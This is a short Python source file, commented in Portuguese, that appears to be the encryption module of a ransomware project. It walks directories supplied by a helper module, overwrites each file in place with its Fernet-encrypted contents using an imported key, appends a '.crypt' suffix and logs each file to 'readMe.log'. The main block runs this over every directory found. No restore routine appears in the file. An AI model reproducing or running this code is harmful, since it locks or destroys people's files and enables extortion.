import os 
from cryptography.fernet import Fernet
from findDir import FindDir
from datetime import datetime
from crawling import importaKey


class Cryptografy:
    """""""""""""""""""""""""""""""""
    Criptografa os arquivos
    """""""""""""""""""""""""""""""""
    def __init__(self, lista):
        self.lista = lista
    
    def encrypt(self):
        listaSegura = []
        chave = importaKey()
        cifra = Fernet(chave)
        arquivos = FindDir()
        for itens in arquivos.find_dir():
            if itens in listaSegura:
                pass
            else:
                listaSegura.append(itens)
                with open(itens, 'rb') as f:
                    file = f.read()
                encript = cifra.encrypt(file)
                with open(itens, 'wb') as f:
                    file = f.write(encript)
                with open('readMe.log', 'a') as f:
                    arquivoLog = f.writelines(f'\nO arquivo {itens} foi criptografado em {datetime.now()}\n')
                    
                # renomear os arquivos
                arqui = itens.split('/')
                tamanho = len(arqui) - 1
                nomeDosArquivos = arqui[tamanho]

                # pegando so o caminho para ir ao diretório e renomear os arquivos
                caminhos = itens.split('/')
                tamanho2 = len(caminhos) - 1
                novoCaminho = '/'.join(caminhos[:tamanho2]) + '/'
                os.chdir(novoCaminho)
                os.rename(f'./{nomeDosArquivos}', f'./{nomeDosArquivos}.crypt')
            

if __name__ == '__main__':
    encontraDir = FindDir()
    diretorios = encontraDir.find_dir()
    crypto = Cryptografy(diretorios)
    crypto.encrypt()
